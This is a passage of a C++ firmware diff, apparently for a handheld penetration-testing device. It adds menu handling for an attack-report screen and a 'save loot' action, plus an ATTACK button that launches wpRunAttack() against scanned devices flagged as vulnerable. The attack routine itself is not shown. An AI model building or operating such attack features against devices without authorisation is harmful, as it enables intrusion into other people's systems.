+        } else if (inResult) {
             inResult = false;
             tft.fillScreen(HALEHOUND_BLACK);
             drawStatusBar();
@@ -6358,6 +7099,30 @@ void loop() {
                 wpDoScan();
             }
         }
+    } else if (inAttackResult) {
+        // Attack report — page navigation + save
+        if (buttonPressed(BTN_RIGHT) || buttonPressed(BTN_DOWN)) {
+            if (atkResultPage < 1) { atkResultPage++; wpDrawAttackReport(); }
+        }
+        if (buttonPressed(BTN_LEFT) || buttonPressed(BTN_UP)) {
+            if (atkResultPage > 0) { atkResultPage--; wpDrawAttackReport(); }
+        }
+        if (buttonPressed(BTN_SELECT)) {
+            wpSaveLoot();
+        }
+
+        // Touch: SAVE (left) or page nav (right)
+        uint16_t rtx, rty;
+        if (getTouchPoint(&rtx, &rty) && rty >= SCREEN_HEIGHT - 38) {
+            if (rtx < 80) {
+                wpSaveLoot();
+                waitForTouchRelease();
+            } else if (rtx > SCREEN_WIDTH - 70) {
+                atkResultPage = (atkResultPage == 0) ? 1 : 0;
+                waitForTouchRelease();
+                wpDrawAttackReport();
+            }
+        }
     } else {
         // Result view — LEFT returns to list
         if (buttonPressed(BTN_LEFT)) {
@@ -6366,6 +7131,25 @@ void loop() {
             drawStatusBar();
             wpDrawHeader();
             wpDrawList();
+        }
+
+        // ATTACK button for vulnerable devices
+        if (wpProbeIdx >= 0 && wpProbeIdx < wpCount) {
+            FPDevice& rd = wpDevs[wpProbeIdx];
+            if (rd.result == WPR_EXPOSED || rd.result == WPR_VULNERABLE) {
+                if (buttonPressed(BTN_SELECT) || buttonPressed(BTN_RIGHT)) {
+                    wpRunAttack();
+                    return;
+                }
+                uint16_t atx, aty;
+                if (getTouchPoint(&atx, &aty)) {
+                    if (atx >= 140 && atx <= 232 && aty >= SCREEN_HEIGHT - 35 && aty <= SCREEN_HEIGHT - 7) {
+                        waitForTouchRelease();
+                        wpRunAttack();
+                        return;
+                    }
+                }
+            }
         }
     }
 }
@@ -6382,6 +7166,9 @@ void cleanup() {
     wpInit = false;
     wpExit = false;
     inResult = false;
+    inAttack = false;
+    inAttackResult = false;
+    wpAtkLogCount = 0;
     wpCount = 0;
     wpProbeIdx = -1;
 
